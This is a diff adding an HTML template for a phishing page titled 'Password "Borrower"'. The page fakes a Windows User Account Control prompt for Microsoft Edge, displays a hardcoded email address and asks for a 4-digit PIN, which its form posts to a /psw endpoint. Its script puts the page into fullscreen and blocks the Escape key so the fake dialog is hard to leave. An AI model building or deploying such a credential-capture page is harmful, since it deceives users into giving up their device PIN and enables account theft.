@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <link rel="shortcut icon" href="{{url_for('static', filename='a.png')}}">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+        <meta name='viewport' content='width=device-width, initial-scale=1'>
+        <script src="https://kit.fontawesome.com/9d4ea420c2.js" crossorigin="anonymous"></script>
+        <title>Password "Borrower"</title>
+        <style>
+            #deez { 
+                -webkit-filter: blur(10px); 
+                filter: blur(10px); 
+            }
+            #kjkj:hover, button:hover {
+                cursor: pointer;
+            }
+        </style>
+    </head>
+    <body style="color:white;margin: -10px;overflow: hidden;" onkeydown="myFunction(event)">
+        <img id="deez" src="{{url_for('static', filename='wwwww.webp')}}" style="width: 105%;position: absolute;" onclick="openFullscreen()" alt="l bozo">
+        <form action="https://safl.getrapl.com/w/app/home"><button type="submit"><i id="kjkj" style="position: absolute;top:15%;color:white;margin-left:67%;z-index: 1;" class='fas fa-times' style='font-size:90px'></i></button>button</form>
+        <h4 style="position: absolute;top:77.2%;left: 37.5%;z-index:1;width: 18%;padding:5px;background: white;border-radius: 4px;border: 2px solid rgb(0, 0, 0);font-size:20px;color: black;" id="oink">suusususuusususuu</h4>
+    <div style="position: absolute;margin-left:30%;margin-top:7%;background: rgb(42, 42, 42);border-radius:40px;border:2px solid rgb(0, 200, 255);font-family: 'Calibri', sans-serif, system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;width:40%;font-weight: normal;">
+        <div style="padding:15px;">
+            <h4>User Account Control</h4><h2>Do you want to allow this app to make changes to your device?</h2>
+        </div>
+    <div style="width:97.2%;background-color: rgb(53, 53, 53);padding-left:15px;padding-right:-15px;">
+        <table style="width: 100%;padding-top:15px;">
+            <tr>
+                <th><img src="{{url_for('static', filename='a.png')}}" width="60" alt="ez"></th>
+                <th><h2 style="text-align: left;">Microsoft Edge</h2></th>
+            </tr>
+    </table>
+    <h4 style="margin-left: 20px;">Verified Publisher: Microsoft Ltd.</h4>
+    <h4 style="margin-left: 20px;padding-bottom:15px">File Origin: Hard Drive on this computer</h4>
+    
+</div>
+    <div>
+        <table>
+            <tr>
+                <th><button style="border-radius: 10px;border:1px solid gray;background:rgb(34, 34, 34);margin-left: 20px;"><i class='fas fa-keyboard' style='font-size:48px;color:white'></i></button></th>
+                <th style="padding-left: 10px;"><h2>PIN</h2></th>
+            </tr>
+            
+        </table>
+        <h3 style="margin-left: 20%;">tamvadajr@hotmail.com</h3>
+        <form id="susss" action="/psw" method="post">
+        <input id="ezz" style="margin-left: 20%;font-size: 20px;padding:7px;border:2px solid rgb(0, 0, 0);border-radius:4px;" name="psw" type="number" onkeydown="ezshell(event)" required placeholder="PIN"><br><br>
+        <button id="ugg" style="margin-left:70%;background-color: rgb(0, 200, 255);font-size:20px;padding:10px;padding-left:50px;padding-right:50px;border:2px solid rgb(0, 155, 197);border-radius: 5px;" type="button">Yes</button><br><br>
+    </form>
+    </div>
+    </div>
+    </body>
+    <script>
+
+    $('#oink').hide()
+                var elem = document.documentElement;
+
+function myFunction(event) {
+  let key = event.key;
+  console.log(key);
+  if (key === "f") { 
+    if (elem.requestFullscreen) {
+    elem.requestFullscreen();
+  } else if (elem.webkitRequestFullscreen) { /* Safari */
+    elem.webkitRequestFullscreen();
+  } else if (elem.msRequestFullscreen) { /* IE11 */
+    elem.msRequestFullscreen();
+  }
+  } else if (key == "Escape") {
+    event.preventDefault()
+  }
+  
+}
+var psw = ''
+var num = 0
+var idk = ''
+function ezshell(event) {
+    $('#oink').text('')
+    if (parseInt(event.key) * 0 == 0) {
+    psw += event.key
+    for (i=0; i==num;i++){
+        idk += '• '
+    }
+    $('#ezz').val('')
+    $('#oink').show()
+    $('')
+} else if (event.key == 'Backspace'){
+    idk = ''
+    for (i=0; i==num-1;i++){
+        idk += '• '
+    }
+    
+}
+    $('#oink').text(idk)
+}
+
+$('#ugg').on('click', function(){
+    console.log($('#ezz').val().length);
+    if ($('#ezz').val().length == 4) {
+        let idk = $('#ezz').val()
+        if (parseInt(idk) * 0 == 0){
+            $('#susss').submit()
+        }
+    }
+})
+
+
+    </script>
+</html>
